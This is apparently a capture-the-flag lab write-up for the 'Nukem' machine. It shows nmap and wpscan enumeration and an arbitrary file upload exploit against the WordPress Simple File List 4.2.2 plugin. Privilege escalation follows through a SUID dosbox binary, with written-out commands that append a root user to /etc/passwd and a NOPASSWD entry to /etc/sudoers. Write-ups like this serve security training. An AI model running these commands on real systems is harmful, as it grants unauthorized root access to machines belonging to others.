---
icon: ubuntu
---

# Nukem - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.161.105 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-01 13:07 EDT
Nmap scan report for 192.168.161.105
Host is up (0.028s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 8.3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:6a:f5:d3:30:08:7a:ec:38:28:a0:88:4d:75:da:19 (RSA)
|   256 43:3b:b5:bf:93:86:68:e9:d5:75:9c:7d:26:94:55:81 (ECDSA)
|_  256 e3:f7:1c:ae:cd:91:c1:28:a3:3a:5b:f6:3e:da:3f:58 (ED25519)
80/tcp    open  http        Apache httpd 2.4.46 ((Unix) PHP/7.4.10)
|_http-server-header: Apache/2.4.46 (Unix) PHP/7.4.10
|_http-title: Retro Gamming &#8211; Just another WordPress site
|_http-generator: WordPress 5.5.1
3306/tcp  open  mysql       MariaDB 10.3.24 or later (unauthorized)
5000/tcp  open  http        Werkzeug httpd 1.0.1 (Python 3.8.5)
|_http-title: 404 Not Found
|_http-server-header: Werkzeug/1.0.1 Python/3.8.5
13000/tcp open  http        nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Login V14
36445/tcp open  netbios-ssn Samba smbd 4
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (94%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6.0
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (94%), Linux 2.6.32 - 3.13 (91%), Linux 3.2 - 4.14 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%), Linux 3.10 - 4.11 (90%), Linux 3.4 - 3.10 (90%), OpenWrt 22.03 (Linux 5.10) (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   34.16 ms 192.168.45.1
2   29.29 ms 192.168.45.254
3   27.15 ms 192.168.251.1
4   27.30 ms 192.168.161.105
```

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (999).png" alt=""><figcaption></figcaption></figure>

Our nmap scan did reveal this is a wordpress site, the site seems to be emphasizing it as well.

I am going to run wpscan in the background while, enumerating the site manually.

```
wpscan --url http://192.168.161.105
```

A simple wp scan revealed an uploads directory and an interesting plugin:

<figure><img src="../../.gitbook/assets/image (2287).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2289).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2290).png" alt=""><figcaption></figcaption></figure>

The Simple File List plugin discovered is version 4.2.2, I am going to check for any possible exploits

<figure><img src="../../.gitbook/assets/image (2291).png" alt=""><figcaption></figcaption></figure>

There are 2 exploits available, I'll download and try the Abitrary File Upload version

### <mark style="color:$primary;">Wordpress Plugin Exploit</mark>

<mark style="color:$primary;">**Simple File List 4.2.2 Arbitrary File Upload**</mark>

<figure><img src="../../.gitbook/assets/image (2292).png" alt=""><figcaption></figcaption></figure>

I am going to update the payload section with my machines IP & port

<figure><img src="../../.gitbook/assets/image (2294).png" alt=""><figcaption></figcaption></figure>

Before executing the script, make sure you have a listener ready

```
python3 48979.py  http://192.168.161.105
```

<figure><img src="../../.gitbook/assets/image (2295).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (2296).png" alt=""><figcaption></figcaption></figure>

There is another user on this box besides root, I am going to look for some credentials in config files before I start running linpeas.

<figure><img src="../../.gitbook/assets/image (2297).png" alt=""><figcaption></figcaption></figure>

in the /srv/http folder I found wp-config.php and inside I found some credentials for MySQL databse, let's check if there is credential reuse before jumping on the database.

<figure><img src="../../.gitbook/assets/image (2298).png" alt=""><figcaption></figcaption></figure>

it worked, I am going to run linpeas next.

### <mark style="color:$primary;">Linpeas</mark>

<figure><img src="../../.gitbook/assets/image (2299).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Dosbox SUID exploit</mark>

the SUID bit is set on dosbox. Checking [**GTFObins**](https://gtfobins.github.io/gtfobins/dosbox/#suid) we find the following:

<figure><img src="../../.gitbook/assets/image (2300).png" alt=""><figcaption></figcaption></figure>

We can write to a file with this. I am going to use it to create another root user and add him to the /etc/passwd file. First I will generate a hashed password

```
openssl passwd Deimos123!
```

<figure><img src="../../.gitbook/assets/image (2301).png" alt=""><figcaption></figcaption></figure>

Now I am going to create the line I will be adding to the /etc/passwd file

```
deimos:$1$XOZyr4LA$L38jubCve3daN6ydTjaGJ.:0:0:root:/root:/bin/bash
```

Now we are going to set LFILE to the file we want to write to

```
LFILE=/etc/passwd
```

<figure><img src="../../.gitbook/assets/image (2302).png" alt=""><figcaption></figcaption></figure>

Now for the final command to write to the file, in order to get this to work I will need to add backslashes in front of all the special characters

```
/usr/bin/dosbox -c 'mount c /' -c "echo deimos:\$1\$XOZyr4LA\$L38jubCve3daN6ydTjaGJ.:0:0:root:/root:/bin/bash >> c:$LFILE" -c exit
```

<figure><img src="../../.gitbook/assets/image (2304).png" alt=""><figcaption></figcaption></figure>

ok the first time i messed up and added a backslash where it was not necessary. Looks like it worked the second time, now let's try to change to deimos&#x20;

Huh? ok You know what I am just going to add commander to the sudoers file!

```
LFILE='/etc/sudoers'
```

<figure><img src="../../.gitbook/assets/image (2305).png" alt=""><figcaption></figcaption></figure>

```
/usr/bin/dosbox -c 'mount c /' -c "echo commander ALL=(ALL) NOPASSWD: ALL >> c:$LFILE" -c exit
```

<figure><img src="../../.gitbook/assets/image (2306).png" alt=""><figcaption></figcaption></figure>

ok it worked, now let's elevate to root!

<figure><img src="../../.gitbook/assets/image (2307).png" alt=""><figcaption></figcaption></figure>

Now we have root!&#x20;
